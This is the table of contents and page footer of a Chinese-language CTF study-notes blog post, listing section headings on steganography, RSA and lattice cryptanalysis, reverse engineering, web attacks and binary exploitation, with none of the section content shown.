        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kali"><span class="toc-number">1.</span> <span class="toc-text">Kali</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">1.1.</span> <span class="toc-text">共享文件夹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Google"><span class="toc-number">2.1.</span> <span class="toc-text">Google</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webs"><span class="toc-number">2.2.</span> <span class="toc-text">Webs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7"><span class="toc-number">2.3.</span> <span class="toc-text">属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rtf"><span class="toc-number">2.4.</span> <span class="toc-text">rtf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gif"><span class="toc-number">2.5.</span> <span class="toc-text">gif</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#binwalk"><span class="toc-number">2.6.</span> <span class="toc-text">binwalk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="toc-number">2.7.</span> <span class="toc-text">ZIP伪加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%85%E9%87%8C%E5%8F%B6%E7%9B%B2%E6%B0%B4%E5%8D%B0"><span class="toc-number">2.8.</span> <span class="toc-text">傅里叶盲水印</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wireshark"><span class="toc-number">2.9.</span> <span class="toc-text">Wireshark</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E6%94%B9%E5%8F%98"><span class="toc-number">2.10.</span> <span class="toc-text">图片宽高改变</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#F5%E9%9A%90%E5%86%99"><span class="toc-number">2.11.</span> <span class="toc-text">F5隐写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png%E8%A1%A5%E9%BD%90IDAT"><span class="toc-number">2.12.</span> <span class="toc-text">png补齐IDAT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B9%E5%B8%A6%E7%A7%81%E8%B4%A7"><span class="toc-number">2.13.</span> <span class="toc-text">文件夹带私货</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSB%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99"><span class="toc-number">2.14.</span> <span class="toc-text">LSB图像隐写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Webs-1"><span class="toc-number">3.1.</span> <span class="toc-text">Webs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.</span> <span class="toc-text">数论基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E8%AE%A9%E5%BE%B7%E7%AC%A6%E5%8F%B7"><span class="toc-number">3.2.1.</span> <span class="toc-text">勒让德符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E7%9A%84%E6%80%A7%E8%B4%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text">二次剩余的性质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E8%AE%A9%E5%BE%B7%E7%AC%A6%E5%8F%B7%E4%B8%AD%E8%B4%A8%E6%95%B0%E7%9A%84%E6%80%A7%E8%B4%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">勒让德符号中质数的性质</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RC4"><span class="toc-number">3.3.</span> <span class="toc-text">RC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">常见编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASCII"><span class="toc-number">3.5.</span> <span class="toc-text">ASCII</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64"><span class="toc-number">3.6.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XOR"><span class="toc-number">3.7.</span> <span class="toc-text">XOR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.</span> <span class="toc-text">凯撒密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA%E7%AD%BE%E5%90%8D"><span class="toc-number">3.9.</span> <span class="toc-text">RSA签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA"><span class="toc-number">3.10.</span> <span class="toc-text">RSA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-enc-key"><span class="toc-number">3.10.1.</span> <span class="toc-text">0 .enc .key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-e-16"><span class="toc-number">3.10.2.</span> <span class="toc-text">1 e&#x3D;16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-pqrs-%E4%BD%86%E6%98%AFnext-prime"><span class="toc-number">3.10.3.</span> <span class="toc-text">2 pqrs,但是next_prime()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BA%8C%E9%A1%B9%E5%BC%8F%E6%A8%A1"><span class="toc-number">3.10.4.</span> <span class="toc-text">3 二项式模</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%8D%E7%9F%A5%E9%81%93%E5%8F%A6%E4%B8%80%E5%8D%8A"><span class="toc-number">3.10.5.</span> <span class="toc-text">4 不知道另一半</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%99%E5%87%BA-p-q-q-p"><span class="toc-number">3.10.6.</span> <span class="toc-text">5 给出 $p^q+q^p$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%B7%B2%E7%9F%A5-msg-2-a-msg-1-b-Franklin-Reiter-attack-%E7%9B%B8%E5%85%B3%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB"><span class="toc-number">3.10.7.</span> <span class="toc-text">6 已知 $msg_2&#x3D;a*msg_1+b$ Franklin-Reiter attack 相关消息攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E9%95%BF%E5%BA%A6129%E4%BD%8D-n%E9%95%BF%E5%BA%A62048%E4%BD%8D-%E7%84%B6%E5%90%8E%E4%B8%89%E4%BB%BD%E5%AF%86%E6%96%87%E5%BE%97%E5%88%B0%E4%BA%86-m-2"><span class="toc-number">3.10.8.</span> <span class="toc-text">flag长度129位,n长度2048位,然后三份密文得到了 $m^2$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%A8%A1%E6%84%8F%E4%B9%89%E6%80%9D%E8%80%83"><span class="toc-number">3.10.9.</span> <span class="toc-text">7 模意义思考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E7%BB%99%E5%AE%9A-n-ppq-%E9%A2%9D%E5%A4%96hint-invert-n-p-1-q-1"><span class="toc-number">3.11.</span> <span class="toc-text">8 给定 $n&#x3D;ppq$ ,额外hint&#x3D;invert(n,(p-1)*(q-1))</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pollard%E2%80%99s-p-1-method"><span class="toc-number">3.11.1.</span> <span class="toc-text">Pollard’s p-1 method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Williams%E2%80%99-p-1-method"><span class="toc-number">3.11.2.</span> <span class="toc-text">Williams’ p+1 method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wiener-Attack-%E7%BB%B4%E7%BA%B3%E6%94%BB%E5%87%BB-%E8%BF%9E%E5%88%86%E6%95%B0%E6%94%BB%E5%87%BB"><span class="toc-number">3.12.</span> <span class="toc-text">Wiener Attack 维纳攻击 连分数攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CopperSmith"><span class="toc-number">3.12.1.</span> <span class="toc-text">CopperSmith</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2048%E4%BD%8D%E7%9F%A5%E9%81%93%E5%89%8D1108%E4%BD%8D%E4%B8%8D%E7%9F%A5%E9%81%93%E5%90%8E940%E4%BD%8D"><span class="toc-number">3.12.1.1.</span> <span class="toc-text">2048位知道前1108位不知道后940位:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E9%81%93%E4%BD%8E%E4%BD%8D400%E6%B1%82%E9%AB%98%E4%BD%8D112"><span class="toc-number">3.12.2.</span> <span class="toc-text">知道低位400求高位112</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3q-%E7%BB%99%E5%AE%9An-p-q-3-%E4%BB%A5%E5%8F%8Aq%E7%9A%84%E9%AB%98381%E4%BD%8D-%E5%B0%9D%E8%AF%95%E5%88%86%E8%A7%A3pq"><span class="toc-number">3.12.3.</span> <span class="toc-text">3q: 给定n&#x3D;p*(q^3) 以及q的高381位,尝试分解pq:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E4%BD%8E%E4%BD%8D%E6%B1%82%E9%AB%98%E4%BD%8D"><span class="toc-number">3.12.4.</span> <span class="toc-text">已知明文低位求高位</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%95%B0%E5%A4%84%E7%90%86"><span class="toc-number">3.13.</span> <span class="toc-text">大数处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1"><span class="toc-number">3.13.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task2"><span class="toc-number">3.13.2.</span> <span class="toc-text">task2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task3"><span class="toc-number">3.13.3.</span> <span class="toc-text">task3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Knapsnack"><span class="toc-number">3.14.</span> <span class="toc-text">Knapsnack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grobner%E5%9F%BA"><span class="toc-number">3.15.</span> <span class="toc-text">Gröbner基</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">3.15.1.</span> <span class="toc-text">例题1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ECC-%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86"><span class="toc-number">3.16.</span> <span class="toc-text">ECC 椭圆曲线加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E9%81%93%E4%B8%A4%E4%B8%AAQ%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84k%E6%B1%82P"><span class="toc-number">3.16.1.</span> <span class="toc-text">知道两个Q和对应的k求P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5P-a-b-mod-%E5%B7%B2%E7%9F%A52P-3P-%E2%80%A6-7P"><span class="toc-number">3.16.2.</span> <span class="toc-text">未知P,a,b,mod,已知2P,3P,…,7P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECDLP-%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0"><span class="toc-number">3.16.3.</span> <span class="toc-text">ECDLP 椭圆曲线离散对数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%AF%86%E7%A0%81-Lattice"><span class="toc-number">3.17.</span> <span class="toc-text">格密码 Lattice</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELLL"><span class="toc-number">3.17.1.</span> <span class="toc-text">关于LLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Random-Revenge"><span class="toc-number">3.17.2.</span> <span class="toc-text">Java Random Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E9%80%89%E8%89%B2%E9%97%AE%E9%A2%98"><span class="toc-number">3.17.3.</span> <span class="toc-text">中国剩余定理选色问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E4%B8%80%E4%B8%AA%E6%A8%A1-mathbb-F-2-8-mathbb-F-2-x-X-8-X-4-X-3-X-1-%E7%9A%84%E7%8E%AF%E4%B8%AD%E6%B1%82%E8%A7%A3%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84-Ax-b"><span class="toc-number">3.17.4.</span> <span class="toc-text">在一个模 $\mathbb{F}_{2^8}&#x3D;\mathbb{F}_2[x]&#x2F;(X^8+X^4+X^3+X+1)$ 的环中求解线性方程组 Ax&#x3D;b</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E7%8E%AF%E4%B8%8A%E7%9A%84%E6%AC%A0%E5%AE%9A%E6%96%B9%E7%A8%8B%E7%BB%84"><span class="toc-number">3.17.5.</span> <span class="toc-text">整数环上的欠定方程组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%84%8F%E4%B9%89%E4%B8%8B%E7%9A%84%E6%AC%A0%E5%AE%9A%E6%96%B9%E7%A8%8B%E7%BB%84"><span class="toc-number">3.17.6.</span> <span class="toc-text">模意义下的欠定方程组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LWE-%E5%AE%B9%E9%94%99%E5%AD%A6%E4%B9%A0%E9%97%AE%E9%A2%98-learning-with-errors-problem"><span class="toc-number">3.17.7.</span> <span class="toc-text">LWE 容错学习问题 learning with errors problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E5%8A%A0%E5%AF%86%E4%BD%93%E7%B3%BB-NTRU"><span class="toc-number">3.17.8.</span> <span class="toc-text">神秘加密体系(NTRU)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mt19937"><span class="toc-number">3.17.9.</span> <span class="toc-text">mt19937</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E9%9B%86%E5%92%8C"><span class="toc-number">3.17.10.</span> <span class="toc-text">子集和</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFSR"><span class="toc-number">3.18.</span> <span class="toc-text">LFSR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AES"><span class="toc-number">3.19.</span> <span class="toc-text">AES</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E9%A2%98"><span class="toc-number">3.20.</span> <span class="toc-text">神秘题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1-1"><span class="toc-number">3.20.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task2-1"><span class="toc-number">3.20.2.</span> <span class="toc-text">task2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSFuck"><span class="toc-number">3.21.</span> <span class="toc-text">JSFuck</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA-EXE-ELF"><span class="toc-number">4.1.</span> <span class="toc-text">IDA(EXE ELF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E4%BF%AE%E6%94%B9%E6%BA%90%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.1.</span> <span class="toc-text">IDA修改源文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jadx-gui-APK-CLASS"><span class="toc-number">4.2.</span> <span class="toc-text">Jadx_gui(APK CLASS)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%B7%AF%E5%BE%84"><span class="toc-number">5.2.</span> <span class="toc-text">常见路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BurpSuite"><span class="toc-number">5.3.</span> <span class="toc-text">BurpSuite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-number">5.4.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-SSH%E5%8F%8D%E5%90%91Shell%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">5.5.</span> <span class="toc-text">反弹shell SSH反向Shell端口映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.6.</span> <span class="toc-text">几个需要注意的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-sha1%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="toc-number">5.7.</span> <span class="toc-text">md5,sha1强碰撞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools"><span class="toc-number">5.8.</span> <span class="toc-text">pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HackBar"><span class="toc-number">5.9.</span> <span class="toc-text">HackBar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">5.10.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AE%A1%E8%AE%A1"><span class="toc-number">5.10.1.</span> <span class="toc-text">php审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backup"><span class="toc-number">5.11.</span> <span class="toc-text">backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">5.12.</span> <span class="toc-text">优先级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="toc-number">5.13.</span> <span class="toc-text">Linux大杂烩</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.14.</span> <span class="toc-text">Sql注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">6.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PRE"><span class="toc-number">6.1.</span> <span class="toc-text">PRE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E5%A3%B3"><span class="toc-number">6.2.</span> <span class="toc-text">查壳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-number">6.3.</span> <span class="toc-text">ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1-2"><span class="toc-number">6.3.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9A%84%E7%AD%94%E6%A1%88%E2%80%A6"><span class="toc-number">6.3.2.</span> <span class="toc-text">这个题的答案…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E5%B9%BF%E6%B3%9B%E5%9C%B0%E2%80%A6"><span class="toc-number">6.3.3.</span> <span class="toc-text">更广泛地…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task2-2"><span class="toc-number">6.3.4.</span> <span class="toc-text">task2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task3-1"><span class="toc-number">6.3.5.</span> <span class="toc-text">task3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task4"><span class="toc-number">6.3.6.</span> <span class="toc-text">task4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E9%93%BE"><span class="toc-number">6.4.</span> <span class="toc-text">ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1-3"><span class="toc-number">6.4.1.</span> <span class="toc-text">task1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary-%E9%87%91%E4%B8%9D%E9%9B%80"><span class="toc-number">6.5.</span> <span class="toc-text">Canary 金丝雀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ex-%E6%8B%BF%E5%88%B0%E9%9D%B6%E6%9C%BA%E7%9A%84sh%E4%B9%8B%E5%90%8E%E6%88%91%E4%BB%AC%E8%83%BD%E5%B9%B2%E4%BB%80%E4%B9%88%E5%91%A2"><span class="toc-number">6.6.</span> <span class="toc-text">Ex. 拿到靶机的sh之后我们能干什么呢?</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote"><span class="toc-number">7.</span> <span class="toc-text">Remote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">7.1.</span> <span class="toc-text">1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF%E6%9D%BF%E5%AD%90"><span class="toc-number">8.</span> <span class="toc-text">CTF板子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#md5"><span class="toc-number">8.1.</span> <span class="toc-text">md5</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://narafluorine.github.io/2024/09/04/20008_CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&text=CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&is_video=false&description=CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF&body=Check out this article: https://narafluorine.github.io/2024/09/04/20008_CTF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&name=CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://narafluorine.github.io/2024/09/04/20008_CTF/&t=CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2026
    Fluorine Wengers
  </div>
  <!-- 不蒜子统计 -->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
  <!-- 不蒜子统计 -->
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/friends/">友链</a></li><!--
     --><!--
       --><li><a href="/QSL/">QSL</a></li><!--
     -->
      </ul>
    </nav>
  </div>

</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
